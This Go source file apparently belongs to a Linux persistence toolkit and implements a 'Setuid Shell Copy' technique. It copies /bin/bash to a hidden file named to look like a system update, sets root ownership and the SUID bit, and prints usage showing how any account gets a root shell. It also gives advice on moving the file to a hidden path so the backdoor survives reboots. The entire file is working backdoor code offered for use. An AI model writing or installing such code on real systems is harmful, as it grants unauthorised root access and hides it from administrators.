//go:build linux

package techniques

import (
	"fmt"
	"os"
	"os/exec"
)

type SetuidShell struct {
	shellPath string
}

func NewSetuidShell() Technique {
	return &SetuidShell{
		shellPath: "/tmp/.sysupdate",
	}
}

func (s *SetuidShell) Name() string {
	return "Setuid Shell Copy"
}

func (s *SetuidShell) Description() string {
	return "SUID copy of /bin/bash for instant root"
}

func (s *SetuidShell) StealthLevel() string {
	return "low"
}

func (s *SetuidShell) SurvivesReboot() bool {
	return false // /tmp usually cleared on reboot
}

func (s *SetuidShell) Install() error {
	// Copy bash to a hidden location
	cmd := exec.Command("cp", "/bin/bash", s.shellPath)
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("copy bash: %w", err)
	}
	
	// Set ownership to root
	if err := os.Chown(s.shellPath, 0, 0); err != nil {
		return fmt.Errorf("chown: %w", err)
	}
	
	// Set SUID bit
	if err := os.Chmod(s.shellPath, 04755); err != nil {
		return fmt.Errorf("chmod: %w", err)
	}
	
	return nil
}

func (s *SetuidShell) Remove() error {
	return os.Remove(s.shellPath)
}

func (s *SetuidShell) Details() string {
	return fmt.Sprintf(`SUID shell created: %s

Usage:
  %s -p              # Get root shell with -p flag
  
From any user account:
  $ %s -p
  bash-5.1# id
  uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)

Note: This persists only until reboot (stored in /tmp)
For permanent persistence, move to /usr/local/bin/.backup
`, s.shellPath, s.shellPath, s.shellPath)
}
